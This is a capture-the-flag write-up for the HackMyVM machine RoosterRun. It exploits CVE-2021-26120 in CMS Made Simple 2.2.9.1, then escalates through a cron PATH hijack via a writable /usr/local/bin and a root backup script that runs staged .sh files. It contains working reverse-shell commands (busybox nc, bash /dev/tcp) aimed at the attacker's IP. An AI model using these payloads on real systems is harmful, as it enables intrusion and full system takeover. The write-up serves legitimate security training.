# RoosterRun

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| RoosterRun | cromiphi | Beginner | HackMyVM |

**Summary:** RoosterRun is a beginner-level Linux machine running an Apache web server hosting **CMS Made Simple version 2.2.9.1**. The attack path begins with an unauthenticated time-based SQL injection vulnerability (**CVE-2021-26120**) in the CMS, which allows us to leak the admin username, extract and abuse a password-reset token, authenticate to the admin panel, and ultimately achieve Remote Code Execution via Server-Side Template Injection (SSTI) in the Simplex template engine — all in a single public PoC script. From the `www-data` shell we discover that `/usr/local/bin` has a permissive ACL granting `www-data` write access. By dropping a malicious `find` binary there, we hijack a cron job running as `matthieu` (which internally calls `find` via the `StaleFinder` script), obtaining a shell as that user. For the final privilege escalation to `root`, we abuse a second cron job executed by root that runs `run-parts` on `/opt/maintenance/prod-tasks`. The directory `pre-prod-tasks` is world-writable, and the `backup.sh` script automatically copies `.sh` files from it into `prod-tasks` before executing them — giving us a clean path to a root shell.

---

## Reconnaissance

### Network Discovery

The target was identified on the local network using a custom PowerShell scanner:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.132 08:00:27:1C:39:1A VirtualBox
```

The target IP is **192.168.100.132**, confirmed as a VirtualBox guest by its MAC OUI.

### Port Scanning

A full TCP port scan with service/version detection was run against the target:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/roosterrun]
└─$ nmap -sC -sV -p- -T4 192.168.100.132
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-26 17:16 WIB
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Nmap scan report for 192.168.100.132
Host is up (0.0024s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey:
|   256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)
|_  256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Home - Blog
|_http-server-header: Apache/2.4.57 (Debian)
|_http-generator: CMS Made Simple - Copyright (C) 2004-2023. All rights reserved.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.17 seconds
```

**Key findings:**
- **Port 22/tcp** — OpenSSH 9.2p1 (Debian). No immediate attack surface without credentials.
- **Port 80/tcp** — Apache 2.4.57 serving a CMS Made Simple blog. The Nmap HTTP generator header immediately fingerprints the CMS.

### Web Application Fingerprinting

Browsing to `http://192.168.100.132/` revealed a blog powered by **CMS Made Simple**. The page footer confirmed the exact version:

![](image.png)

The footer text reads: *"This site is powered by CMS Made Simple version **2.2.9.1**"*. This is a critical piece of information — a known CVE exists for this specific version line.

---

## Initial Access

### Vulnerability Research — CVE-2021-26120

A search for known vulnerabilities in CMS Made Simple 2.2.x led to **CVE-2021-26120**, a critical **unauthenticated SQL injection** vulnerability. A public PoC is available at:

```
https://srcincite.io/pocs/cve-2021-26120.py.txt
```

This vulnerability exists in the `m1_idlist` parameter of the `News` module. An attacker can perform a time-based blind SQL injection to:
1. Leak the admin username.
2. Leak the password reset token from the database.
3. Perform a password reset using the leaked token.
4. Log in as `admin`.
5. Inject a payload into the Simplex template to achieve **Remote Code Execution**.

### Confirming RCE

The PoC was first run with `id` as the command to confirm code execution:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/roosterrun]
└─$ python3 poc.py 192.168.100.132 / id
/tmp/roosterrun/poc.py:78: SyntaxWarning: invalid escape sequence '\?'
  match = re.search("style.php\?__c=(.*)\"", r.text)
/tmp/roosterrun/poc.py:148: SyntaxWarning: invalid escape sequence '\?'
  match = re.search("Welcome: <a href=\"myaccount.php\?__c=[a-z0-9]*\">(.*)<\/a>", r.text)
(+) targeting http://192.168.100.132/
(+) sql injection working!
(+) leaking the username...
(+) username: admin
(+) resetting the admin's password stage 1
(+) leaking the pwreset token...
(+) pwreset: 47f9b28a18b93446297f26eda9b00fce
(+) done, resetting the admin's password stage 2
(+) logging in...
(+) leaking simplex template...
(+) injecting payload and executing cmd...

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The script:
- Leaked the admin username: **`admin`**
- Extracted the password reset token: **`47f9b28a18b93446297f26eda9b00fce`**
- Logged in and injected a command payload via the Simplex template
- Returned command output running as **`www-data`** (UID 33)

### Obtaining a Reverse Shell

With confirmed RCE, a reverse shell was triggered using `busybox nc`. A listener was set up first:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/roosterrun]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
```

Then the PoC was re-run with a `busybox` reverse shell payload:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/roosterrun]
└─$ python3 poc.py 192.168.100.132 / "busybox nc 192.168.100.1 4444 -e /bin/bash"
/tmp/roosterrun/poc.py:78: SyntaxWarning: invalid escape sequence '\?'
  match = re.search("style.php\?__c=(.*)\"", r.text)
/tmp/roosterrun/poc.py:148: SyntaxWarning: invalid escape sequence '\?'
  match = re.search("Welcome: <a href=\"myaccount.php\?__c=[a-z0-9]*\">(.*)<\/a>", r.text)
(+) targeting http://192.168.100.132/
(+) sql injection working!
(+) leaking the username...
(+) username: admin
(+) resetting the admin's password stage 1
(+) leaking the pwreset token...
(+) pwreset: c3fc1a704c7c9162802c6d37bc214787
(+) done, resetting the admin's password stage 2
(+) logging in...
(+) leaking simplex template...
(+) injecting payload and executing cmd...
```

The connection was received and the shell was stabilised:

```bash
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 60604
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@rooSter-Run:/var/www/html$ ^Z
zsh: suspended  nc -lnvp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/roosterrun]
└─$ stty raw -echo; fg
[1]  + continued  nc -lnvp 4444

www-data@rooSter-Run:/var/www/html$ export SHELL=bash
www-data@rooSter-Run:/var/www/html$ export TERM=xterm
www-data@rooSter-Run:/var/www/html$ stty rows 74 cols 154
www-data@rooSter-Run:/var/www/html$
```

We now have a fully interactive TTY as `www-data`.

---

## Post-Exploitation Enumeration (www-data → matthieu)

### User Discovery

```bash
www-data@rooSter-Run:/var/www/html$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/usr/bin/zsh
matthieu:x:1000:1000:,,,:/home/matthieu:/bin/zsh
```

Two accounts use a shell: `root` and `matthieu` (UID 1000). The `matthieu` home directory was inspected:

```bash
www-data@rooSter-Run:/var/www/html$ ls -la /home/matthieu/
total 40
drwxr-xr-x  4 matthieu matthieu 4096 Feb 26 11:07 .
drwxr-xr-x  3 root     root     4096 Sep 24  2023 ..
lrwxrwxrwx  1 root     root        9 Sep 24  2023 .bash_history -> /dev/null
-rw-r--r--  1 matthieu matthieu  220 Sep 22  2023 .bash_logout
-rw-r--r--  1 matthieu matthieu 3526 Sep 22  2023 .bashrc
drwxr-xr-x  3 matthieu matthieu 4096 Sep 22  2023 .local
drwxr-xr-x 12 matthieu matthieu 4096 Sep 22  2023 .oh-my-zsh
-rw-r--r--  1 matthieu matthieu  807 Sep 22  2023 .profile
-rw-r--r--  1 matthieu matthieu 3915 Sep 22  2023 .zshrc
-rwxr-xr-x  1 matthieu matthieu  302 Sep 23  2023 StaleFinder
-rwx------  1 matthieu matthieu   33 Sep 24  2023 user.txt
```

The `user.txt` flag is readable only by `matthieu`. Of note is a custom script: `StaleFinder`.

### Analysing StaleFinder

```bash
www-data@rooSter-Run:/home/matthieu$ cat StaleFinder
#!/usr/bin/env bash

for file in ~/*; do
    if [[ -f $file ]]; then
        if [[ ! -s $file ]]; then
            echo "$file is empty."
        fi

        if [[ $(find "$file" -mtime +365 -print) ]]; then
            echo "$file hasn't been modified for over a year."
        fi
    fi
done
```

This script iterates over files in `matthieu`'s home directory and calls the external **`find`** binary — a significant detail exploitable via PATH hijacking.

### Process Monitoring with pspy64

Enumeration tools were transferred from the attacker machine via a Python HTTP server:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/opt]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
172.21.32.1 - - [26/Feb/2026 17:43:49] "GET /pspy64 HTTP/1.1" 200 -
172.21.32.1 - - [26/Feb/2026 17:43:59] "GET /linpeas.sh HTTP/1.1" 200 -
```

```bash
www-data@rooSter-Run:/tmp$ which wget
/usr/bin/wget
www-data@rooSter-Run:/tmp$ wget http://192.168.100.1:8080/pspy64
--2026-02-26 11:43:46--  http://192.168.100.1:8080/pspy64
Connecting to 192.168.100.1:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: 'pspy64'

pspy64                                   0%[                                                                           ]    pspy64                                 100%[==========================================================================>]   2.96M  --.-KB/s    in 0.09s

2026-02-26 11:43:46 (31.7 MB/s) - 'pspy64' saved [3104768/3104768]

www-data@rooSter-Run:/tmp$ wget http://192.168.100.1:8080/linpeas.sh
--2026-02-26 11:43:56--  http://192.168.100.1:8080/linpeas.sh
Connecting to 192.168.100.1:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 971926 (949K) [application/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh                               0%[                                                                           ]       0  --.-KB/s          linpeas.sh                             100%[==========================================================================>] 949.15K  --.-KB/s    in 0.03s

2026-02-26 11:43:56 (28.7 MB/s) - 'linpeas.sh' saved [971926/971926]
www-data@rooSter-Run:/tmp$ chmod +x pspy64 linpeas.sh
```

Running `pspy64` revealed two critical cron jobs executing every minute:

```bash
...
2026/02/26 11:45:01 CMD: UID=0     PID=1616   | /usr/sbin/CRON -f
2026/02/26 11:45:01 CMD: UID=0     PID=1615   | /usr/sbin/cron -f
2026/02/26 11:45:01 CMD: UID=0     PID=1617   | /usr/sbin/CRON -f
2026/02/26 11:45:01 CMD: UID=0     PID=1618   | /usr/sbin/CRON -f
2026/02/26 11:45:01 CMD: UID=1000  PID=1619   | /bin/sh -c /home/matthieu/StaleFinder
2026/02/26 11:45:01 CMD: UID=0     PID=1620   | /bin/sh -c /bin/bash /opt/maintenance/backup.sh
2026/02/26 11:45:02 CMD: UID=1000  PID=1622   | bash /home/matthieu/StaleFinder
2026/02/26 11:45:02 CMD: UID=0     PID=1621   | /bin/bash /opt/maintenance/backup.sh
2026/02/26 11:45:02 CMD: UID=0     PID=1623   | /bin/bash /opt/maintenance/backup.sh
2026/02/26 11:45:02 CMD: UID=1000  PID=1624   | bash /home/matthieu/StaleFinder
...
```

Two cron jobs of interest:
- **UID=1000 (matthieu)** — runs `/home/matthieu/StaleFinder` every minute.
- **UID=0 (root)** — runs `/opt/maintenance/backup.sh` every minute.

### ACL Misconfiguration on /usr/local/bin

```bash
www-data@rooSter-Run:/home/matthieu/.oh-my-zsh/log$ ls -la /usr/local/
total 40
drwxr-xr-x  10 root root 4096 Jun 15  2023 .
drwxr-xr-x  14 root root 4096 Jun 15  2023 ..
drwxrwx---+  2 root root 4096 Sep 24  2023 bin
drwxr-xr-x   2 root root 4096 Jun 15  2023 etc
drwxr-xr-x   2 root root 4096 Jun 15  2023 games
drwxr-xr-x   2 root root 4096 Jun 15  2023 include
drwxr-xr-x   3 root root 4096 Jun 15  2023 lib
lrwxrwxrwx   1 root root    9 Jun 15  2023 man -> share/man
drwxr-xr-x   2 root root 4096 Jun 15  2023 sbin
drwxr-xr-x   6 root root 4096 Sep 20  2023 share
drwxr-xr-x   2 root root 4096 Jun 15  2023 src
www-data@rooSter-Run:/home/matthieu/.oh-my-zsh/log$ getfacl /usr/local/bin
getfacl: Removing leading '/' from absolute path names
# file: usr/local/bin
# owner: root
# group: root
user::rwx
user:www-data:rwx
user:matthieu:r-x
group::---
mask::rwx
other::---
```

The POSIX ACL on `/usr/local/bin` grants **`www-data` full read/write/execute access** — a serious misconfiguration. Since `/usr/local/bin` takes precedence over `/usr/bin` in the default PATH, any binary placed here will be found before the real system binary.

### PATH Hijacking — Dropping a Fake `find`

The `StaleFinder` script calls `find` without an absolute path. By writing a malicious `find` binary to `/usr/local/bin/`, we intercept the next cron execution running as `matthieu`:

```bash
www-data@rooSter-Run:/home/matthieu/.oh-my-zsh/log$ cat <<EOF > /usr/local/bin/find
> #!/bin/bash
> bash -i >& /dev/tcp/192.168.100.1/8888 0>&1
> EOF
www-data@rooSter-Run:/home/matthieu/.oh-my-zsh/log$ chmod +x /usr/local/bin/find
```

A listener was set up on port 8888:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/opt]
└─$ nc -lnvp 8888
listening on [any] 8888 ...
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 61096
bash: cannot set terminal process group (1812): Inappropriate ioctl for device
bash: no job control in this shell
matthieu@rooSter-Run:~$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
matthieu@rooSter-Run:~$ ^Z
zsh: suspended  nc -lnvp 8888

┌──(ouba㉿CLIENT-DESKTOP)-[/opt]
└─$ stty raw -echo; fg
[1]  + continued  nc -lnvp 8888

matthieu@rooSter-Run:~$ export SHELL=bash
matthieu@rooSter-Run:~$ export TERM=xterm
matthieu@rooSter-Run:~$ stty rows 78 cols 150
```

We are now **`matthieu`** with a stable TTY.

---

## Privilege Escalation (matthieu → root)

### Inspecting the Root Cron Job — backup.sh

```bash
matthieu@rooSter-Run:~$ ls -la /opt/maintenance/
total 20
drwxr-xr-x  4 root root 4096 Sep 24  2023 .
drwxr-xr-x+ 3 root root 4096 Sep 19  2023 ..
-rwxr-xr-x  1 root root  367 Sep 20  2023 backup.sh
drwx---rwt  2 root root 4096 Sep 24  2023 pre-prod-tasks
drwx---rwx  2 root root 4096 Sep 24  2023 prod-tasks
```

Directory permissions:
- `pre-prod-tasks` — mode `rwt` for others (world-writable with sticky bit).
- `prod-tasks` — mode `rwx` for others (world-writable and world-executable).

```bash
matthieu@rooSter-Run:~$ getfacl /opt/maintenance/
getfacl: Removing leading '/' from absolute path names
# file: opt/maintenance/
# owner: root
# group: root
user::rwx
group::r-x
other::r-x
```

```bash
matthieu@rooSter-Run:~$ id
uid=1000(matthieu) gid=1000(matthieu) groups=1000(matthieu),100(users)
matthieu@rooSter-Run:~$ cat /opt/maintenance/backup.sh
#!/bin/bash

PROD="/opt/maintenance/prod-tasks"
PREPROD="/opt/maintenance/pre-prod-tasks"


for file in "$PREPROD"/*; do
  if [[ -f $file && "${file##*.}" = "sh" ]]; then
    cp "$file" "$PROD"
  else
    rm -f ${file}
  fi
done

for file in "$PROD"/*; do
  if [[ -f $file && ! -O $file ]]; then
  rm ${file}
  fi
done

/usr/bin/run-parts /opt/maintenance/prod-tasks
```

**How this works:**
1. Any file with a `.sh` extension placed in `pre-prod-tasks` is **copied** to `prod-tasks` (the copy is owned by `root` since `cp` is run by root).
2. Files in `prod-tasks` **not owned** by root are deleted — so only files placed there via the `cp` step survive.
3. `run-parts` executes all files in `prod-tasks` **as root**.

This is a textbook **cron script injection** via a world-writable staging directory.

### Crafting and Deploying the Payload

A reverse shell payload was prepared and placed in `pre-prod-tasks`:

```bash
matthieu@rooSter-Run:/tmp$ nano pwn
matthieu@rooSter-Run:/tmp$ chmod +x pwn
matthieu@rooSter-Run:/tmp$ cat pwn
#!/bin/bash
busybox nc 192.168.100.1 4444 -e /bin/bash
matthieu@rooSter-Run:/tmp$ cp /tmp/pwn /opt/maintenance/pre-prod-tasks/pwn.sh
```

The root cron fires every minute. Attempts to rename it before the cron ran demonstrate the timing race — eventually the cron copied it to `prod-tasks` as root:

```bash
matthieu@rooSter-Run:/tmp$ mv /opt/maintenance/prod-tasks/pwn.sh /opt/maintenance/prod-tasks/pwn
mv: cannot stat '/opt/maintenance/prod-tasks/pwn.sh': No such file or directory
matthieu@rooSter-Run:/tmp$ mv /opt/maintenance/prod-tasks/pwn.sh /opt/maintenance/prod-tasks/pwn
mv: cannot stat '/opt/maintenance/prod-tasks/pwn.sh': No such file or directory
matthieu@rooSter-Run:/tmp$ mv /opt/maintenance/prod-tasks/pwn.sh /opt/maintenance/prod-tasks/pwn
mv: cannot stat '/opt/maintenance/prod-tasks/pwn.sh': No such file or directory
matthieu@rooSter-Run:/tmp$ mv /opt/maintenance/prod-tasks/pwn.sh /opt/maintenance/prod-tasks/pwn
matthieu@rooSter-Run:/tmp$ mv /opt/maintenance/prod-tasks/pwn.sh /opt/maintenance/prod-tasks/pwn
mv: cannot stat '/opt/maintenance/prod-tasks/pwn.sh': No such file or directory
matthieu@rooSter-Run:/tmp$ ls -la /opt/maintenance/prod-tasks/pwn
-rwxr-xr-x 1 root root 55 Feb 26 12:38 /opt/maintenance/prod-tasks/pwn
matthieu@rooSter-Run:/tmp$ cat /opt/maintenance/prod-tasks/pwn
#!/bin/bash
busybox nc 192.168.100.1 4444 -e /bin/bash
```

The file is now **owned by root** in `prod-tasks`. `run-parts` will execute any executable file that matches its naming rules. On the next cron tick, the listener received the root shell:

```bash
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 61552
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
hostname
rooSter-Run
cat /home/matthieu/user.txt
32a[REDACTED]
cat /root/root.txt
670[REDACTED]
```

**Root achieved. Both flags captured.**

---

## Attack Chain Summary

1. **Reconnaissance**: Full TCP port scan revealed port 22 (SSH) and port 80 (Apache). The HTTP generator header and page footer exposed **CMS Made Simple version 2.2.9.1**.

2. **Vulnerability Discovery**: Version 2.2.9.1 is vulnerable to **CVE-2021-26120** — an unauthenticated time-based blind SQL injection in the `News` module that leaks admin credentials and a password reset token, enabling admin panel takeover.

3. **Exploitation**: The public PoC (`cve-2021-26120.py`) automated the full exploit chain: SQL injection → credential leak → password reset → admin login → Simplex template SSTI → RCE as `www-data`.

4. **Internal Enumeration**: `pspy64` revealed two cron jobs running every minute — one as `matthieu` executing `StaleFinder` (which calls `find` via PATH), and one as `root` executing `backup.sh`. `getfacl` on `/usr/local/bin` revealed a misconfigured ACL granting `www-data` write access, enabling a **PATH hijack**.

5. **Lateral Movement (www-data → matthieu)**: A malicious `find` binary was written to `/usr/local/bin/`. On the next cron tick, `matthieu`'s `StaleFinder` executed our fake `find`, delivering a reverse shell as `matthieu`.

6. **Privilege Escalation (matthieu → root)**: `backup.sh` copies world-writable `.sh` files from `pre-prod-tasks` into `prod-tasks` as root, then calls `run-parts` to execute them. A reverse shell payload (`pwn.sh`) was planted in `pre-prod-tasks`, automatically promoted to root-owned, and executed by root's cron job — yielding a **root shell**.
